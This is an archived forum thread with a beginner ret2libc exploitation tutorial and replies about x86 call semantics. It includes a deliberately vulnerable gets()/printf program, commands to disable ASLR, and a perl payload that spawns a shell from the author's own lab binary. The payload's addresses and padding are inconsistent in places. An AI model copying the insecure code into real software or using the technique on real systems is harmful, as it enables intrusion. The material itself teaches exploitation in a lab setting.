<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Exploiting Techniques \000 - ret2libc - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="So it’s been a while since I last wrote an article and I think it’s time for a new one. 
Since the straight forward smash stacking has already been covered plenty, I decided to start this serie with ret2libc. 
It is assu&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="index.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Exploiting Techniques \000 - ret2libc&#39;" href="1833.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833" />
<meta name="twitter:url" content="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833" />
<meta property="og:title" content="Exploiting Techniques \000 - ret2libc" />
<meta name="twitter:title" content="Exploiting Techniques \000 - ret2libc" />
<meta property="og:description" content="So it’s been a while since I last wrote an article and I think it’s time for a new one.  Since the straight forward smash stacking has already been covered plenty, I decided to start this serie with ret2libc.  It is assumed that you already understand the normal exploiting techniques, so make sure you already understand the following topics:   C Programming, pointers, functions etc ASM (x86 will be used in this article) How the stack works (ebp, esp, return adress, parameters, locals, etc) How t..." />
<meta name="twitter:description" content="So it’s been a while since I last wrote an article and I think it’s time for a new one.  Since the straight forward smash stacking has already been covered plenty, I decided to start this serie with ret2libc.  It is assumed that you already understand the normal exploiting techniques, so make sure you already understand the following topics:   C Programming, pointers, functions etc ASM (x86 will be used in this article) How the stack works (ebp, esp, return adress, parameters, locals, etc) How t..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="8 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="67 ❤" />
<meta property="article:published_time" content="2017-03-26T23:48:22+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="1833%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="index.html">Exploiting Techniques \000 - ret2libc</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Exploiting Techniques \000 - ret2libc">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-26T23:48:22Z" class="post-time">
March 26, 2017, 11:48pm
</time>
<meta itemprop="dateModified" content="2017-04-03T10:15:23Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>So it’s been a while since I last wrote an article and I think it’s time for a new one.<br>
Since the straight forward smash stacking has already been covered plenty, I decided to start this serie with ret2libc.</p>
<p>It is assumed that you already understand the normal exploiting techniques, so make sure you already understand the following topics:</p>
<ul>
<li>C Programming, pointers, functions etc</li>
<li>ASM (x86 will be used in this article)</li>
<li>How the stack works (ebp, esp, return adress, parameters, locals, etc)</li>
<li>How to do smashstacking</li>
<li>Probably having done some RE might help.</li>
</ul>
<h2>Why Ret2libc</h2>
<p>Between hackers and security specialists there is an eternal clash of cleverness.<br>
Some hacker finds a new technique to exploit a bug and so the security specialist comes up with a way to prevent that technique from working by introducing a new technique to prevent that specific attack.<br>
One of these techniques was smash stacking, writing shellcode to a buffer, and overwriting the return adress in the stackframe to a pointer to that buffer to execute the shellcode.<br>
So a couple of security specialists discussed the problem and come up with a solution:<br>
<strong>Non executable stack</strong> is what they came up with.<br>
What this means is pretty straight forward: The shellcode on the stack can no longer be executed, since the processor is not allowed to execute instructions placed on the stack.<br>
This worked until some clever came up with a new technique: <strong>ret2libc</strong></p>
<h2>How Ret2libc Works</h2>
<p>The idea of Ret2libc is pretty simple: Why write a shellcode, when there is plenty of useful functions residing in the <strong>C library</strong> already?<br>
After all when we write a program we’re mainly using the libc’s functions anyway.</p>
<p>So let’s look at how a function works in C.<br>
x86’s call instruction actually does two things:</p>
<ol>
<li>Push eip on stack</li>
<li>Jump to the function adress</li>
</ol>
<p>before this some parameters might be pushed on the stack, after that some local variables might assigned on the stack.<br>
But what matters is the push eip and the jump.</p>
<p>So what would happen if we return into a new function?</p>
<p>the function would assume a return adress was pushed on the stack and that above that return adress (higher adress) would be the arguments.</p>
<p>So what this means is that we manage to overwrite the return adress of a vulnerable function with the return adress of a function somewhere in memory we would like to execute we now know where it expects it’s arguments.<br>
But that would mean we can call a function and fabricate the arguments as well!<br>
If this might sound vague don’t worry we’ll see what it means with an example.</p>
<h2>Exploiting a Very Vulnerable Program with Ret2libc</h2>
<p>So let’s look at some really, really vulnerable code (seriously don’t ever write stuff like this)</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[])
{
    char buf[256];

    gets(buf);
    printf(buf);

    return 0;
}
</code></pre>
<p>This program is not only vulnerable to ret2libc, but also to format string attacks, but that’s not of importance here (though it can make things easier).</p>
<p>So now compile it with the following flags:<br>
<code>gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -o ret2libc ret2libc.c</code></p>
<p>Also make sure to turn off ALSR :<br>
<code>sudo su - root</code><br>
<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>
<code>exit</code></p>
<p>So now let’s exploit this program to spawn a shell.<br>
The function we’ll be using is in libc and you might have used it once or twice: <code>system()</code><br>
System is nice, because it takes only one argument, a string being the command you which to execute (for more info <code>man 3 system</code> )</p>
<p>What interests us are 3 things:</p>
<ol>
<li>The length of the buffer (and from where the return adress begins).</li>
<li>The adress of system in libc.</li>
<li>In this case, the adress of the start of the buffer</li>
</ol>
<p>Since we’re exploiting gets here, we don’t have to worry about nullbytes (newlines however are a problem, so keep that in mind if you ever mess around with <code>gets</code> ).</p>
<p>So to get the adress of system, we will be using <code>gdb</code>, for the length of the buffer we will just mess around a bit until we find it (use gdb or something like that) It’s probably at 260 anyway and for the adress of the buffer we will be using <code>ltrace</code>.</p>
<p><em><strong>Getting the adress of system</strong></em><br>
Open up <code>gdb</code> :<br>
<code>gdb ./ret2libc</code><br>
Withing gdb:<br>
<code>break main</code><br>
<code>run</code><br>
<code>p system</code> (make a note of the adress)<br>
<code>q</code> (we’re done here).</p>
<p><em><strong>Getting the buffersize</strong></em><br>
do something like:<br>
<code>perl -e 'print "a" x 260 . "bbbb"' | ./ret2libc</code><br>
check in gdb, should be something like ‘0x62626262, invalid instruction’, else mess around the numbers of a’s till you get that error.</p>
<p><em><strong>Getting the adress of the start of the buffer</strong></em><br>
This one is really simple.<br>
simply run:<br>
<code>ltrace ./ret2libc</code><br>
in there you should see something like:<br>
<code>gets( some stuff ) = 0xffff3d28</code><br>
This is exactly what we need, because get’s returns the argument passed to it if it succeeds, meaning we found the adress of the buffer (yay).</p>
<p>Now that we got all the ingredients, let’s work on actually exploiting it.<br>
We will be doing the following:<br>
begin our vulnerable input with:<br>
<code>"/bin/sh\x00"</code><br>
(this will be the argument passed to system (luckily we know it’s adress, which happens to be the start of the buffer ^^).</p>
<p>then we need to fill until the return adress with whatever you like.<br>
<code>"a" x 260</code> sounds perfect.</p>
<p>Now comes the return adress, this is what ret2libc makes ret2libc.<br>
fill in the adress of <code>system</code> which you obtained earlier.<br>
Let’s assume it’s <code>0xf7e503e0</code> so after the a’s will come:<br>
<code>"\xe0\x03\xe5\xf7"</code><br>
This will make the function return into the start of the function system.</p>
<p><strong>Ok now the tricky part comes</strong>, remember how I was mumbling about the function expecting to have the return adress being pushed on the stack by the functon call? Well it didn’t, since we <em>returned</em> into the function rather than <em>call</em> the function!</p>
<p>So our next 4 bytes will be either a valid return adress (perhaps another C library function ^^?), or some random garbage.<br>
For the sake of simplicity I’ve chosen for random garbage, meaning the program will segfault afterwards.</p>
<p>After the 4 bytes of garbage will come the parameter to function <code>system</code>.<br>
In this case it’s a string, which we found earlier!<br>
so fill it in here (for me it was <code>0xffff3d28</code>) :<br>
<code>"\x28\x3d\xff\xff"</code>.</p>
<p>In total we should now have something like the following:<br>
<code>perl -e 'print "/bin/sh\x00" . "a" x 260 . "\xe0\x03\xe5\xf7" . "aaaa" . "\x28\xd3\xff\xff"'</code></p>
<p>You can chose to output it to a file so you can <code>cat</code> it later and not make a mess from your terminal:<br>
<code>perl -e 'print "/bin/sh\x00" . "a" x 260 . "\xe0\x03\xe5\xf7" . "aaaa" . "\x28\xd3\xff\xff"' &gt; hakz</code></p>
<p>Now let’s try it ( with a nice trick to prevent the program from immediatly closing )<br>
<code>(cat hakz; echo ""; cat) | ./ret2libc</code></p>
<p>Voila! A working exploit.</p>
<h2>Conclusion</h2>
<p>Well as you can see we’ve now exploited a trivial program. Ofcourse you’d probably never encounter a program compiled with these flags, but that was not the point here.<br>
The reason this won’t work nowadays are two techniques used in almost every compiler / OS nowadays:</p>
<ol>
<li>Canaries (overwriting a <code>canary value</code> on the stack will terminate the program).</li>
<li>ALSR (The adress of libc functions will be different each time you run the program).</li>
</ol>
<p>This was a very basic introduction to ret2libc, please tell me how you liked it and feel free to ask questions!</p>
<p>~ IoTh1nKN0t</p>
<p>EDIT:</p>
<aside class="quote no-group quote-modified" data-username="_py" data-post="9" data-topic="1833" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar"> _py:</div>
<blockquote>
<p>Here’s the basic idea (keep in mind this will work on 32-bit binaries):</p>
<pre><code class="lang-auto">                           Stack
                  +----------------------+
                  |       "/bin/sh"      |
                  +----------------------+
                  |   ret_after_system   |
                  +----------------------+
                  |     system_addr      |   &lt;-- ret
                  +----------------------+
                  |         ....         |
                  |         ....         |
                  | "AAAAAAAAAAAAAAAAAA" |
                  |         ....         |
                  |         ....         |
                  +----------------------+
</code></pre>
<p>{{NOTE THAT THE “/bin/sh” THERE IS A POINTER TO A STRING, NOT THE STRING ITSELF}}<br>
It’s the same as a buffer/stack overflow but with a twist. Since you can’t return to the stack because it’s not executable, you have to return somewhere else. Libc in that case could be pretty handy.</p>
<p><a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> wanted to call system(). So all he had to do is “simulate” the function calling convention behaviour and jump to system()'s code. Because the binary is 32-bit the function prologue in our case would be the following:</p>
<p>Push the return address on the stack.<br>
Push the function’s arguments.<br>
Jump to system()'s code.</p>
<p>When we have a case of a classic stack overflow, you overflow the stack and overwrite the pushed return address with the one of your shellcode’s. Once gets() is done it’ll jump to wherever the pushed return address is pointing to. But, there is no shellcode this time, there is system(). And in order to call system() you have to follow the above convention in order to look legit.</p>
<p>By the way, now that I look at <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a>’s perl command, I think the order should be different(?). I might be wrong though.<br>
{{FIXED THAT ^^}}</p>
</blockquote>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="25" />
<span class="post-likes">25 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/4.html">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</a>
<meta itemprop="position" content="1">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../exploit-mitigation-techniques-data-execution-prevention-dep/index.html">Exploit Mitigation Techniques - Data Execution Prevention (DEP)</a>
<meta itemprop="position" content="2">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.html">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</a>
<meta itemprop="position" content="3">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-27T03:36:32Z" class="post-time">
March 27, 2017, 3:36am
</time>
<meta itemprop="dateModified" content="2017-03-27T03:36:32Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="IoTh1nkN0t" data-post="1" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/ioth1nkn0t/40/3912_2.png" class="avatar"> IoTh1nkN0t:</div>
<blockquote>
<p>x86’s call instruction actually does two things:</p>
<p>Push eip on stack</p>
</blockquote>
</aside>
<p>Either I’ve become super rusty at assembly or the <em>address of the instruction after the call</em> is pushed onto the stack.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-27T12:16:36Z" class="post-time">
March 27, 2017, 12:16pm
</time>
<meta itemprop="dateModified" content="2017-03-27T12:51:06Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/dtm">@dtm</a>: What <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> wrote wasn’t <strong>technically</strong> wrong. He just didn’t go into the details which wasn’t important for the write-up. I’ll analyse it though since it might be useful to others.</p>
<p>So:</p>
<p>AFAIK (I will simplify it a little bit) , these are the stages the CPU goes through in order to process and execute an instruction (if I forgot a stage, correct me):</p>
<ul>
<li>Fetch</li>
<li>Decode</li>
<li>Execute</li>
<li>Memory</li>
<li>Write back</li>
<li>EIP Update</li>
</ul>
<p>I will focus on the <em>fetch</em> and <em>EIP update</em> stage since those two mess around with the instruction pointer.</p>
<p><strong><em>Note</em></strong>: <em>I won’t go into much detail but I can make a separate post about it.</em></p>
<hr>
<p>###<span class="hashtag">#Fetch</span></p>
<p>With the help of a hardware unit, let’s call it instruction memory, the instruction bytes are fetched from the memory being pointed by EIP. During that stage, it computes the address of the next instruction (and a bunch of other stuff as well), let’s call it valNextAddr, which will be the addition between the current instruction offset and its size, aka EIP + sizeof(fetched_instruction). It’s important to note that this calculation is done <strong>before</strong> the completion of the instruction. That valNextAddr is being generated as a signal through the combination logic.</p>
<p>###<span class="hashtag">#EIP</span> Update</p>
<p>After the rest of the stages are completed, and right before the instruction cycle is over, the <strong>state</strong> of the circuit is updated (meaning, the wires are generating values for the register file, for the next instruction etc) and once the clock is about to hit high, the clock registers, including EIP/PC will be updated.</p>
<hr>
<p>TLDR: Before the current instruction is completely finished, EIP will be updated with its new value. Meaning, during the call instruction, you are pushing EIP indeed and NOT the address of the next instruction. So technically, saying “the address of the instruction after the call is pushed onto the stack” means that you will skip an instruction, which is not the case because EIP is already updated to the address of the next instruction during the call instruction.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-27T12:26:20Z" class="post-time">
March 27, 2017, 12:26pm
</time>
<meta itemprop="dateModified" content="2017-03-27T13:54:52Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Another note:</p>
<p>Though I’m familiar with that exploitation technique, I feel like the post could be way more juicy to those who haven’t got around it if there were snippets of the PoC (i.e how the memory looks like right before the system()'s call and much more).</p>
<p>You are the author though so it’s your call.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-27T16:13:59Z" class="post-time">
March 27, 2017, 4:13pm
</time>
<meta itemprop="dateModified" content="2017-03-27T16:13:59Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hmm yea I was maybe a bit too straight forward, thanks for the feedback!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-27T16:15:33Z" class="post-time">
March 27, 2017, 4:15pm
</time>
<meta itemprop="dateModified" content="2017-03-27T16:15:33Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yes on top of that returning is just <code>pop eip</code></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-03-27T17:45:02Z" class="post-time">
March 27, 2017, 5:45pm
</time>
<meta itemprop="dateModified" content="2017-03-27T17:45:02Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Your write-up was pretty solid overall. I just felt that at some parts you assumed certain details to be known from the reader’s side and it might confuse them.</p>
<p>Just to be clear, I’m not saying your post is unclear. Just suggesting that in case your target audience isn’t only peeps who are familiar with pwning, you could add 1-2 snippets to trigger their curiosity about this whole “magic”.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-02T09:04:16Z" class="post-time">
April 2, 2017, 9:04am
</time>
<meta itemprop="dateModified" content="2017-04-02T09:04:16Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I put off reading this initially, because i wanted to read it with a clear mind and time set aside for it. Since this concept is fairly tough to understand.</p>
<p>I don’t fully understand what’s going on, though,</p>
<aside class="quote no-group quote-modified" data-username="IoTh1nkN0t" data-post="1" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/ioth1nkn0t/40/3912_2.png" class="avatar"> IoTh1nkN0t:</div>
<blockquote>
<p>perl -e ‘print “/bin/sh\x00” . “a” x 252 . “\xe0\x03\xe5\xf7” . “aaaa” . “\x28\xd3\xff\xff”’ &gt; hakz</p>
</blockquote>
</aside>
<p>So you’re printing your parameters, a buffer, the address of libc? Another buffer and then the address of system?</p>
<p>Why is it in this order?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="index.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-04-02T10:34:52Z" class="post-time">
April 2, 2017, 10:34am
</time>
<meta itemprop="dateModified" content="2017-04-02T10:34:52Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Here’s the basic idea (keep in mind this will work on 32-bit binaries):</p>
<pre><code class="lang-makefile">                           Stack
                  +----------------------+
                  |       "/bin/sh"      |
                  +----------------------+
                  |   ret_after_system   |
                  +----------------------+
                  |     system_addr      |   &lt;-- ret
                  +----------------------+
                  |         ....         |
                  |         ....         |
